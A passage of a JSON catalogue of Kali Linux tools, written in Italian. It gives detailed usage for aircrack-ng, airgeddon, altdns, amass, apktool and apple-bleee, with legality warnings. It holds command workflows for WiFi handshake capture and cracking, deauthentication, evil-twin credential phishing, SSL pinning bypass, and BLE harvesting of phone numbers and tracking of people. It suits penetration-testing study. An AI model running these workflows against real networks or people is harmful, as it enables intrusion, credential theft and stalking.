Forensics</strong>, dopo aver acquisito la RAM di un sistema sospetto (DumpIt, LiME, FTK Imager), aeskeyfind permette di recuperare chiavi di volumi cifrati senza bisogno della password utente.</p><p>Nel <strong>Cold Boot Attack</strong>, la RAM DDR3/DDR4 mantiene i dati per 5-15 secondi dopo lo spegnimento (estendibile a minuti con raffreddamento a -50°C), permettendo il recupero di chiavi.</p><p>Per <strong>Hibernation Analysis</strong>, hiberfil.sys contiene una copia compressa della RAM al momento dell'ibernazione, spesso con chiavi FDE ancora presenti.</p><p>In <strong>Incident Response</strong>, l'analisi di crash dump Windows (MEMORY.DMP) può rivelare chiavi usate da ransomware o malware per cifrare dati.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Limitazioni:</strong> Funziona solo se la chiave era in memoria al momento del dump. Sistemi con protezioni avanzate (Secure Boot, VBS, SGX enclaves) possono offuscare o isolare le chiavi.</p><p><strong>Contromisure:</strong> Windows 11 con VBS/Credential Guard isola le chiavi in memoria protetta. TPM-only BitLocker senza PIN non lascia chiavi in RAM utente.</p><p><strong>Legalità:</strong> L'accesso a dati cifrati senza autorizzazione è illegale. Tool destinato esclusivamente a forensics autorizzata.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Memory_Analysis"
    ],
    "notes": null
  },
  {
    "id": "aircrack-ng",
    "name": "aircrack-ng",
    "version": "1.7",
    "icon": "../app/icons/aircrack-ng-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/aircrack-ng/",
    "desc": "Suite completa per auditing reti WiFi: cattura pacchetti, deauth, crack WEP/WPA/WPA2.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Aircrack-ng</strong> è la suite standard de facto per il penetration testing di reti wireless 802.11a/b/g/n/ac. Composta da oltre 20 tool specializzati, copre l'intero ciclo di attacco: dalla messa in monitor mode dell'interfaccia, alla cattura del traffico, all'iniezione di pacchetti per accelerare la raccolta dati, fino al cracking offline delle chiavi WEP/WPA/WPA2/WPA3 (quest'ultimo con limitazioni). È il fondamento su cui si basano framework più automatizzati come Airgeddon, Wifite e Fluxion.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Airmon-ng:</strong> Configura le schede wireless in monitor mode e gestisce i processi interferenti (NetworkManager, wpa_supplicant).</p><p><strong>Airodump-ng:</strong> Scansiona e cattura il traffico wireless, identificando AP, client connessi, signal strength, canali e raccogliendo handshake WPA/WPA2 e PMKID.</p><p><strong>Aireplay-ng:</strong> Inietta pacchetti per forzare deautenticazioni (cattura handshake), fake authentication, ARP replay (WEP), chopchop e fragmentation attack.</p><p><strong>Aircrack-ng:</strong> Cracker offline. Attacca WEP statisticamente (PTW/KoreK) e WPA/WPA2 via dizionario con supporto SIMD (SSE2, AVX, AVX2, AVX512) per massime prestazioni CPU.</p><p><strong>Airdecap-ng:</strong> Decifra pacchetti WEP/WPA catturati una volta nota la chiave, permettendo l'analisi del traffico in chiaro.</p><p><strong>Airtun-ng:</strong> Crea interfacce tunnel virtuali per iniezione/cattura avanzata e attacchi MITM wireless.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Workflow tipico per WPA2:</p><pre><code># === SETUP MONITOR MODE ===\n# Kill processi interferenti e attiva monitor mode\nairmon-ng check kill\nairmon-ng start wlan0\n# Verifica: iwconfig wlan0mon\n\n# === SCANSIONE RETI ===\n# Scansione completa 2.4GHz + 5GHz\nairodump-ng wlan0mon --band abg\n\n# Scansione mirata solo WPA2 con info WPS\nairodump-ng wlan0mon --encrypt WPA2 --wps --manufacturer\n\n# === CATTURA HANDSHAKE ===\n# Target specifico su canale 6\nairodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon\n\n# Deauth broadcast (rumoroso ma efficace)\naireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon\n\n# Deauth mirato singolo client (più stealth)\naireplay-ng -0 3 -a AA:BB:CC:DD:EE:FF -c CC:DD:EE:FF:00:11 wlan0mon\n\n# Verifica handshake catturato\naircrack-ng capture-01.cap  # mostra se handshake presente\n\n# === CRACKING ===\n# CPU cracking con dizionario\naircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap\n\n# Converti per hashcat (GPU - 100x più veloce)\naircrack-ng -j hc22000_file capture-01.cap\nhashcat -m 22000 hc22000_file.hc22000 rockyou.txt -O -w 3 -d 1\n\n# === PMKID ATTACK (NO CLIENT NEEDED) ===\n# Cattura PMKID (funziona anche senza client connessi)\nhcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1 --filtermode=2\nhcxpcapngtool -o pmkid.hc22000 pmkid.pcapng\nhashcat -m 22000 pmkid.hc22000 wordlist.txt\n\n# === WEP ATTACK (legacy) ===\n# ARP replay per generare IV\naireplay-ng -3 -b AA:BB:CC:DD:EE:FF wlan0mon\n# Crack quando >50000 IV catturati\naircrack-ng -b AA:BB:CC:DD:EE:FF capture*.cap\n\n# === POST-EXPLOITATION ===\n# Decifra traffico catturato con chiave nota\nairdecap-ng -e \"NetworkName\" -p password123 capture-01.cap\n# Output: capture-01-dec.cap (traffico in chiaro)</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Essenziale in ogni <strong>Wireless Pentest</strong> per verificare la robustezza delle password WiFi aziendali contro attacchi dizionario.</p><p>Per <strong>Rogue AP Detection</strong>, airodump-ng identifica AP non autorizzati confrontando BSSID e ESSID con l'inventario aziendale.</p><p>Per testare <strong>802.11w (Management Frame Protection)</strong>, verifica se i client sono protetti da attacchi deauth.</p><p>In <strong>Red Team</strong>, la cattura di handshake enterprise (WPA2-Enterprise) permette attacchi offline su hash RADIUS/MSCHAPv2.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Deauth frames sono facilmente rilevabili da WIDS/WIPS (Cisco CleanAir, AirMagnet). Molti AP moderni loggano MAC address degli attaccanti.</p><p><strong>Stealth:</strong> Usare deauth singoli (non broadcast), attendere handshake passivamente, o preferire PMKID attack che non richiede deauth.</p><p><strong>Hardware:</strong> Schede consigliate: Alfa AWUS036ACH (AC), Alfa AWUS036ACM, TP-Link Archer T3U Plus. Verificare supporto driver per iniezione.</p><p><strong>Legalità:</strong> L'uso su reti non autorizzate è illegale. In Italia art. 617-quater c.p. (intercettazione abusiva).</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "airgeddon",
    "name": "airgeddon",
    "version": "11.51",
    "icon": "../app/icons/airgeddon-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/airgeddon/",
    "desc": "Script bash all-in-one per attacchi WiFi: evil twin, WPS, handshake capture, DoS wireless.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Airgeddon</strong> è un framework bash multi-uso che orchestra e semplifica l'uso di decine di tool wireless (aircrack-ng, hostapd, dnsmasq, bettercap, mdk4, hashcat, john, crunch, ecc.) attraverso un'interfaccia a menu guidata con oltre 100 opzioni. Automatizza attacchi complessi come Evil Twin con captive portal, KARMA attack, enterprise credential harvesting, permettendo anche a utenti meno esperti di eseguire penetration test wireless avanzati senza dover memorizzare comandi complessi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Evil Twin Attack:</strong> Crea un access point clone con captive portal per phishing delle credenziali WiFi. Include oltre 20 template personalizzabili per diverse lingue, ISP (Vodafone, TIM, Fastweb, ecc.) e router brands. Supporta HTTPS con certificati auto-generati.</p><p><strong>WPS Attacks:</strong> Integra Reaver, Bully e PixieWPS per attacchi a reti con WPS abilitato: PIN brute force (11000 tentativi), Pixie Dust (offline, istantaneo su chip vulnerabili), null PIN e PIN noti.</p><p><strong>Handshake Management:</strong> Cattura, pulisce (rimuove beacon inutili) e verifica handshake WPA/WPA2. Supporta cracking con aircrack-ng, hashcat (GPU), john, e generazione dizionari con crunch.</p><p><strong>DoS Wireless:</strong> Attacchi mdk4 avanzati: deauth (aireplay/mdk4), authentication flood, beacon flood, EAPOL logoff, Michael shutdown (TKIP).</p><p><strong>WPA3 Downgrade:</strong> Tenta di forzare client WPA3 a connettersi in WPA2 transition mode per catturare handshake crackabili.</p><p><strong>Enterprise Attacks:</strong> Evil Twin per WPA2-Enterprise con server RADIUS fake (hostapd-wpe) per catturare credenziali PEAP/MSCHAPv2.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Lanciare lo script e seguire i menu interattivi.</p><pre><code># === AVVIO BASE ===\nsudo airgeddon\n\n# === MENU PRINCIPALI ===\n# 1. Select interface\n# 2. Put interface in monitor mode\n# 3. Target selection (scan networks)\n# 4. Handshake/PMKID tools menu\n# 5. Offline WPA/WPA2 decrypt menu\n# 6. Evil Twin attacks menu\n# 7. WPS attacks menu\n# 8. Enterprise attacks menu\n# 9. DoS attacks menu\n\n# === EVIL TWIN WORKFLOW ===\n# Menu 6 > Option 9 (Evil Twin with captive portal)\n# 1. Seleziona rete target\n# 2. Scegli template captive portal\n# 3. Airgeddon: avvia hostapd + dnsmasq + lighttpd\n# 4. Deauth automatico sulla rete legittima\n# 5. Vittima si connette al fake AP\n# 6. Inserisce password nel captive portal\n# 7. Airgeddon valida la password contro handshake\n\n# === WPS PIXIE DUST ===\n# Menu 7 > Option 4 (Pixie Dust attack)\n# Funziona su router con chip Ralink, Realtek, Broadcom vulnerabili\n# Crack in secondi se vulnerabile\n\n# === ENTERPRISE CREDENTIAL HARVESTING ===\n# Menu 8 > Option 1 (Evil Twin for Enterprise)\n# Cattura username + hash MSCHAPv2\n# Crack offline con hashcat -m 5500</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Ideale per <strong>Wireless Pentesting</strong> rapido quando si ha poco tempo per setup manuali e si preferisce un'interfaccia guidata.</p><p>L'Evil Twin è particolarmente efficace in scenari di <strong>Social Engineering</strong> in luoghi pubblici (hotel, aeroporti, caffè) dove le vittime si connettono volontariamente a reti aperte.</p><p>Per <strong>WPA2-Enterprise Assessment</strong>, il modulo enterprise cattura credenziali aziendali sfruttando la mancata validazione dei certificati sui client.</p><p>Ottimo per <strong>Security Awareness Training</strong> e dimostrazioni live dei rischi del WiFi pubblico.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Evil Twin genera un secondo SSID identico, rilevabile da WIDS/WIPS enterprise. Il deauth continuo è molto visibile nei log.</p><p><strong>Dipendenze:</strong> Richiede ~30 tool esterni (verifica automatica all'avvio). Su Kali Linux la maggior parte sono preinstallati.</p><p><strong>Hardware:</strong> Richiede 2 schede WiFi per Evil Twin completo (una per AP fake, una per deauth). Schede consigliate: Alfa AWUS036ACH (supporta AP mode + monitor simultaneo su alcuni driver).</p><p><strong>Legalità:</strong> Evil Twin e credential harvesting sono reati gravi se non autorizzati (art. 615-ter e 640-ter c.p. in Italia).</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "altdns",
    "name": "altdns",
    "version": "1.0.2",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/altdns/",
    "desc": "Genera permutazioni di sottodomini e risolve DNS per scoprire host nascosti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Altdns</strong> estende la fase di subdomain enumeration generando permutazioni intelligenti dai sottodomini già noti. Se hai trovato <code>dev.example.com</code>, Altdns genererà varianti come <code>dev1</code>, <code>dev-api</code>, <code>staging-dev</code>, <code>devtest</code>, <code>dev-internal</code>, <code>dev.staging</code> e migliaia di altre combinazioni basate su pattern DevOps comuni. Poi risolve massivamente queste permutazioni per identificare quali esistono realmente, scoprendo asset shadow IT che sfuggono ai tool di enumerazione passiva.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Permutation Engine:</strong> Applica regole di mutazione intelligenti: prefissi (dev-, staging-, test-, uat-, prod-), suffissi (-api, -admin, -internal, -backup, -old), sostituzione numeri (1,2,01,02), inserimento separatori (-, _, .). Wordlist personalizzabili per target specifici.</p><p><strong>Mass Resolution:</strong> Risolve massivamente le permutazioni generate tramite DNS query parallele (record A/AAAA). Integrazione con massdns per performance massime (10k+ query/sec).</p><p><strong>Output Filtering:</strong> Esclude automaticamente wildcard DNS per evitare falsi positivi su domini che risolvono qualsiasi query (*.example.com).</p><p><strong>Deduplication:</strong> Rimuove duplicati automaticamente dall'output finale.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede una lista di sottodomini già scoperti e una wordlist di permutazioni.</p><pre><code># === PIPELINE BASE ===\n# 1. Raccogli sottodomini noti\nsubfinder -d target.com -silent | tee known.txt\namass enum -passive -d target.com >> known.txt\nsort -u known.txt -o known.txt\n\n# 2. Genera permutazioni\naltdns -i known.txt -o permuted.txt -w /usr/share/altdns/words.txt\n\n# 3. Risolvi con massdns (veloce)\nmassdns -r /usr/share/massdns/lists/resolvers.txt -t A -o S permuted.txt 2>/dev/null | \\\n  grep -v NXDOMAIN | cut -d' ' -f1 | sed 's/\\.$//' > resolved.txt\n\n# 4. Verifica host live\ncat resolved.txt | httpx -silent -threads 100 | tee live_hosts.txt\n\n# === WORDLIST CUSTOM PER DEVOPS ===\n# Crea wordlist ottimizzata\ncat > devops_words.txt << 'EOF'\ndev\nstaging\nuat\nprod\napi\nadmin\ninternal\nbackup\nold\nnew\ntest\nqa\ndemo\nsandbox\nEOF\n\naltdns -i known.txt -o permuted.txt -w devops_words.txt\n\n# === PIPELINE AVANZATA ===\n# Combina più fonti + permutazioni + vuln scan\n(\n  subfinder -d target.com -silent\n  amass enum -passive -d target.com 2>/dev/null\n  github-subdomains -d target.com -t $GITHUB_TOKEN 2>/dev/null\n) | sort -u | tee all_subs.txt | \\\n  altdns -i - -o - -w words.txt | \\\n  massdns -r resolvers.txt -t A -o S 2>/dev/null | \\\n  grep -oP '^[^ ]+' | sed 's/\\.$//' | sort -u | \\\n  httpx -silent | nuclei -t cves/ -t exposures/ -o vulns.txt\n\n# === ESEMPI PERMUTAZIONI ===\n# Input: api.example.com, dev.example.com\n# Output generato:\n# api-dev.example.com, dev-api.example.com\n# api1.example.com, api2.example.com, api-v2.example.com\n# staging-api.example.com, api-staging.example.com\n# api-internal.example.com, internal-api.example.com</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nella fase di <strong>Asset Discovery</strong>, dopo una prima enumerazione con Amass o Subfinder, Altdns trova i \"cugini\" dei sottodomini noti che seguono naming convention aziendali.</p><p>Spesso scopre ambienti <strong>Shadow IT</strong>: dev, staging, UAT o backup dimenticati che espongono vulnerabilità non presenti in produzione (debug mode, credenziali default, versioni obsolete).</p><p>Per <strong>Bug Bounty</strong>, la discovery di asset dimenticati è una delle tecniche più efficaci per trovare vulnerabilità uniche non già segnalate.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Genera milioni di query DNS. I DNS server target potrebbero loggare o rate-limitare. Usare resolver pubblici (Google, Cloudflare, Quad9) o liste di resolver aperti.</p><p><strong>Volume:</strong> 100 sottodomini input × 1000 parole wordlist = 100.000+ permutazioni. Prevedere tempo adeguato per resolution.</p><p><strong>Falsi Positivi:</strong> Wildcard DNS (*.domain.com) causa migliaia di falsi positivi. Sempre verificare con httpx/httprobe.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "amass",
    "name": "amass",
    "version": "4.2.0",
    "icon": "../app/icons/amass-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/amass/",
    "desc": "Enumerazione sottodomini avanzata con OSINT, brute force, scraping e graph mapping.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>OWASP Amass è il tool più completo e potente per la mappatura della superficie d'attacco esterna (Attack Surface Management). Combina tecniche passive (Certificate Transparency logs, API di terze parti come Shodan/Censys/SecurityTrails, web scraping, archivi DNS) con enumerazione attiva (DNS brute force, zone transfer, permutazioni) per costruire un grafo completo dei sottodomini, IP, ASN e relazioni di un'organizzazione. Il database a grafo integrato permette di tracciare i cambiamenti nel tempo e scoprire relazioni nascoste tra asset.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Enum Mode:</strong> Enumerazione completa che combina oltre 55 fonti di dati (VirusTotal, Shodan, Censys, SecurityTrails, PassiveTotal, RiskIQ, Spyse, ecc.) con risoluzione DNS, brute forcing e alterazioni automatiche.</p><p><strong>Intel Mode:</strong> Raccoglie informazioni sull'organizzazione: ASN, netblock, WHOIS, reverse WHOIS, domini correlati per registrant, name server e certificati SSL condivisi.</p><p><strong>Graph Database:</strong> Salva tutti i risultati in un database a grafo (Cayley/Neo4j), permettendo query complesse sulle relazioni tra asset e visualizzazione con D3.js, Gephi o Maltego.</p><p><strong>Tracking:</strong> Confronta scan successivi per identificare nuovi asset, modifiche all'infrastruttura o domini scaduti/riattivati (subdomain takeover potential).</p><p><strong>Scripting:</strong> Supporta script Lua custom per estendere le fonti dati e la logica di enumerazione.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Configurare le API key nel file config (~/.config/amass/config.ini) per massimizzare i risultati.</p><pre><code># === CONFIGURAZIONE API KEYS ===\n# ~/.config/amass/config.ini\n# [data_sources.VirusTotal]\n# apikey = YOUR_VT_KEY\n# [data_sources.Shodan]\n# apikey = YOUR_SHODAN_KEY\n# [data_sources.SecurityTrails]\n# apikey = YOUR_ST_KEY\n\n# === ENUMERAZIONE COMPLETA ===\n# Enum con tutte le fonti configurate\namass enum -d target.com -config ~/.config/amass/config.ini \\\n  -o results.txt -dir amass_output/ -timeout 60\n\n# === MODALITÀ PASSIVE (STEALTH) ===\n# Zero traffico verso il target\namass enum -passive -d target.com -src -ip -o passive_results.txt\n\n# === INTEL MODE - SCOPRI DOMINI CORRELATI ===\n# Trova tutti i domini dell'organizzazione\namass intel -org \"Target Corporation\" -whois -d target.com\n\n# Espandi da ASN\namass intel -asn 12345,67890 -o asn_domains.txt\n\n# Reverse WHOIS su registrant email\namass intel -whois -d target.com | grep -i registrant\n\n# === BRUTE FORCE AVANZATO ===\n# Brute con wordlist + alterazioni + resolver custom\namass enum -brute -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \\\n  -d target.com -rf resolvers.txt -wm -aw alterations.txt -max-dns-queries 500\n\n# === TRACKING CAMBIAMENTI ===\n# Scan iniziale\namass enum -d target.com -dir ./amass_baseline/\n# ... dopo alcuni giorni ...\namass track -d target.com -dir ./amass_baseline/ -last 2\n# Mostra nuovi sottodomini e modifiche\n\n# === VISUALIZZAZIONE ===\n# Grafo D3.js interattivo\namass viz -d3 -dir ./amass_output/ -o graph.html\n\n# Export per Maltego\namass viz -maltego -dir ./amass_output/ -o maltego.csv\n\n# Export per Gephi\namass db -names -dir ./amass_output/ | amass viz -gexf -\n\n# === PIPELINE BUG BOUNTY ===\namass enum -d target.com -o subs.txt -config config.ini && \\\n  cat subs.txt | httpx -silent -threads 200 | \\\n  nuclei -t cves/ -t exposures/ -t takeovers/ -o vulns.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Pilastro di ogni fase di <strong>External Reconnaissance</strong> per mappare l'intera superficie d'attacco di un'organizzazione.</p><p>Per <strong>Bug Bounty</strong>, Amass è il gold standard per scope discovery. La combinazione di fonti passive trova asset che altri tool perdono.</p><p>Nella <strong>Threat Intelligence</strong>, permette di monitorare l'espansione dell'infrastruttura di gruppi APT e criminali, correlando domini tramite registrant/nameserver.</p><p>Per <strong>M&amp;A Due Diligence</strong>, mappa rapidamente tutti gli asset digitali di un'azienda target.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> La modalità passiva è completamente stealth (nessun traffico verso il target). La modalità attiva (brute) genera traffico DNS sostanziale e può essere rilevata/bloccata.</p><p><strong>Rate Limiting:</strong> Senza API key, le fonti commerciali (Shodan, SecurityTrails, ecc.) limiteranno le query. Investire in API key per risultati completi.</p><p><strong>Tempo:</strong> Scan completi su grandi organizzazioni possono richiedere ore. Usare -timeout e -max-dns-queries per controllare.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "apktool",
    "name": "apktool",
    "version": "2.7.0",
    "icon": "../app/icons/apktool-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/apktool/",
    "desc": "Decompila e ricompila APK Android, permettendo analisi e modifica del codice smali.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Apktool</strong> è lo strumento fondamentale per il reverse engineering di applicazioni Android. Permette di decompilare un file APK nei suoi componenti originali: codice smali (assembly Dalvik/ART), risorse XML, AndroidManifest.xml, assets e file di configurazione. Dopo l'analisi o la modifica, può ricompilare il tutto in un APK funzionante. È essenziale per l'analisi di malware mobile, la ricerca di vulnerabilità, il bypass di controlli di sicurezza e il patching di applicazioni.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Decompilazione:</strong> Estrae tutte le risorse (immagini, layout XML, stringhe, raw assets) nel formato originale e converte il bytecode DEX in codice smali leggibile. Decodifica AndroidManifest.xml in formato leggibile.</p><p><strong>Ricompilazione:</strong> Riassembla i file modificati in un APK valido, gestendo automaticamente la compressione AAPT2, allineamento e struttura corretta.</p><p><strong>Framework Management:</strong> Gestisce i framework di sistema (framework-res.apk, SystemUI.apk) necessari per decompilare app che dipendono da risorse OEM specifiche (Samsung, Xiaomi, ecc.).</p><p><strong>Debugging Support:</strong> Può inserire flag di debug nell'APK ricompilato per permettere debugging con Android Studio.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === DECOMPILAZIONE ===\n# Decompilazione completa\napktool d target.apk -o output_dir\n\n# Decompilazione senza risorse (solo codice)\napktool d target.apk -o output_dir -r\n\n# Decompilazione senza smali (solo risorse)\napktool d target.apk -o output_dir -s\n\n# === ANALISI STRUTTURA ===\n# Dopo decompilazione, struttura tipica:\n# output_dir/\n# ├── AndroidManifest.xml    # Permessi, activities, services\n# ├── apktool.yml            # Metadata apktool\n# ├── res/                   # Risorse (layout, drawable, values)\n# ├── smali/                 # Codice decompilato (smali assembly)\n# ├── assets/                # File raw (config, certificati)\n# └── lib/                   # Native libraries (.so)\n\n# === RICERCA SECRETS ===\n# Cerca API keys hardcoded\ngrep -r \"api_key\\|apikey\\|secret\\|password\\|token\" output_dir/\ngrep -rE \"[A-Za-z0-9]{32,}\" output_dir/res/values/strings.xml\n\n# Cerca URL di backend\ngrep -rE \"https?://[a-zA-Z0-9.-]+\" output_dir/\n\n# === MODIFICA E RICOMPILAZIONE ===\n# Modifica file (es. bypass SSL pinning in smali)\n# Ricompila\napktool b output_dir -o modified.apk\n\n# === FIRMA APK ===\n# Genera keystore (una tantum)\nkeytool -genkey -v -keystore my-release-key.jks -keyalg RSA \\\n  -keysize 2048 -validity 10000 -alias my-alias\n\n# Firma con apksigner (raccomandato)\napksigner sign --ks my-release-key.jks --out signed.apk modified.apk\n\n# Verifica firma\napksigner verify --verbose signed.apk\n\n# === ZIPALIGN (opzionale, migliora performance) ===\nzipalign -v 4 signed.apk aligned.apk\n\n# === INSTALLAZIONE ===\nadb install aligned.apk\n\n# === FRAMEWORK PER APP SISTEMA ===\n# Estrai framework dal device\nadb pull /system/framework/framework-res.apk\napktool if framework-res.apk\n\n# Per Samsung\nadb pull /system/framework/twframework-res.apk\napktool if twframework-res.apk -t samsung</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Mobile Pentesting</strong>, permette di analizzare il codice per trovare hardcoded secrets, API key esposte, endpoint nascosti, logica di autenticazione vulnerabile e bypass di controlli client-side.</p><p>Nell'<strong>Analisi Malware</strong>, consente di esaminare il comportamento di app sospette, identificare C2 server, tecniche di persistence e payload nascosti.</p><p>Per <strong>SSL Pinning Bypass</strong>, modificando il codice smali si può disabilitare il certificate pinning per intercettare il traffico HTTPS.</p><p>Per <strong>Bug Bounty</strong>, è il primo passo per analizzare app Android: cerca IDOR, broken authentication, information disclosure.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Limitazioni:</strong> Decompila in smali (assembly), non in Java. Per codice Java più leggibile, usare jadx o JADX-GUI. App con protezioni (ProGuard, DexGuard, R8) producono codice offuscato con nomi di classi/metodi randomizzati.</p><p><strong>Anti-Tampering:</strong> Molte app verificano l'integrità (signature check, SafetyNet/Play Integrity). Dopo la modifica, potrebbero non funzionare o rilevare il tampering.</p><p><strong>Native Code:</strong> Apktool non decompila librerie native (.so). Per queste usare Ghidra, IDA Pro o radare2.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Reverse_Engineering"
    ],
    "notes": null
  },
  {
    "id": "apple-bleee",
    "name": "apple-bleee",
    "version": "0.1.5",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/apple-bleee/",
    "desc": "Sfrutta vulnerabilità BLE di dispositivi Apple per estrarre numeri di telefono e info.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Apple-bleee</strong> sfrutta le debolezze nei protocolli BLE (Bluetooth Low Energy) proprietari di Apple per estrarre informazioni sensibili dai dispositivi iOS e macOS nelle vicinanze. I dispositivi Apple trasmettono costantemente pacchetti BLE per funzionalità come AirDrop, Handoff, Wi-Fi Password Sharing, Apple Watch Unlock e Continuity, contenenti hash parziali di numeri di telefono, email e Apple ID che possono essere craccati offline per de-anonimizzare gli utenti. La vulnerabilità deriva dall'uso di hash SHA256 troncati a soli 3 byte, che possono essere bruteforcati in pochi minuti dato lo spazio limitato dei numeri telefonici.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Phone Number Extraction:</strong> Cattura gli hash SHA256 troncati (3 byte) dei numeri di telefono trasmessi durante le richieste AirDrop. Con GPU cracking o rainbow tables pre-calcolate per prefissi nazionali, il numero completo viene recuperato in minuti.</p><p><strong>Email Hash Capture:</strong> Intercetta gli hash parziali degli indirizzi email Apple ID trasmessi durante Handoff e Universal Clipboard, correlabili con leak database.</p><p><strong>Device Fingerprinting:</strong> Identifica modello esatto del dispositivo, versione iOS/macOS e stato (schermo on/off, chiamata attiva, AirPods connessi, batteria in carica) dai byte di stato nei pacchetti BLE.</p><p><strong>Presence Tracking:</strong> Monitora la presenza continuativa di dispositivi specifici tracciando i pattern di advertising BLE, anche con MAC randomization attiva (Apple usa identificatori persistenti nei payload).</p><p><strong>Wi-Fi Password Sharing Attack:</strong> Sfrutta il protocollo di condivisione password Wi-Fi per estrarre hash di SSID e credenziali parziali quando due dispositivi Apple sono vicini.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede un adattatore Bluetooth 4.0+ compatibile con modalità monitor BLE (es. CSR 4.0, Ubertooth One, o chip interno su Linux).</p><pre><code># === SETUP AMBIENTE ===\ngit clone https://github.com/hexway/apple_bleee\ncd apple_bleee\npip3 install -r requirements.txt\n\n# Verifica adattatore BLE\nhciconfig hci0 up\nhcitool lescan  # Test scansione\n\n# === SCANSIONE DISPOSITIVI ===\n# Scansione passiva dispositivi Apple (mostra stato, modello)\npython3 ble_read_state.py\n\n# Output: Device, State, WiFi, OS, Phone hash, Email hash\n# Esempio: iPhone 12, Screen On, WiFi On, iOS 15, 0x1a2b3c, 0x4d5e6f\n\n# === ESTRAZIONE NUMERI TELEFONO ===\n# Cattura hash durante richieste AirDrop\npython3 airdrop_leak.py\n\n# Genera rainbow table per prefissi italiani\npython3 hash_generate.py --prefix +39 --output it_phones.txt\n\n# Cracca hash catturato\ngrep \"1a2b3c\" it_phones.txt\n# Output: +393331234567 -> 1a2b3c...\n\n# === TRACKING CONTINUO ===\n# Monitor prolungato con logging\npython3 ble_read_state.py --log devices.csv --interval 5\n\n# Analisi presenza nel tempo\ncat devices.csv | sort | uniq -c | sort -rn</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Physical Pentesting</strong>, permette di identificare e profilare dipendenti target tramite i loro dispositivi Apple prima di un attacco di social engineering, ottenendo numeri di telefono per vishing o smishing.</p><p>In operazioni di <strong>Red Team</strong>, il tracking BLE rivela pattern di movimento dei target (orari di arrivo, pause, riunioni) senza accesso fisico all'edificio.</p><p>Per <strong>Threat Intelligence</strong>, correlare hash email con breach database permette di identificare utenti specifici in luoghi pubblici.</p><p>Essenziale per <strong>Privacy Research</strong> e awareness training, dimostrando i rischi concreti della trasmissione BLE always-on dei dispositivi Apple.</p><p>In <strong>TSCM</strong> (Technical Surveillance Countermeasures), identifica dispositivi Apple nascosti che potrebbero registrare audio/video.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Legalità:</strong> L'intercettazione di comunicazioni Bluetooth è illegale in molte giurisdizioni (GDPR, Wiretap laws). Usare esclusivamente con autorizzazione scritta e in contesti di security assessment autorizzato.</p><p><strong>Hardware Detection:</strong> La scansione BLE attiva può essere rilevata da app di sicurezza sui dispositivi target. Preferire modalità passiva.</p><p><strong>Range Limitato:</strong> BLE ha range effettivo di ~10-30 metri. Posizionarsi in aree ad alto traffico per massimizzare le catture.</p><p><strong>Mitigazioni Apple:</strong> iOS 13.5+ ha ridotto la frequenza di 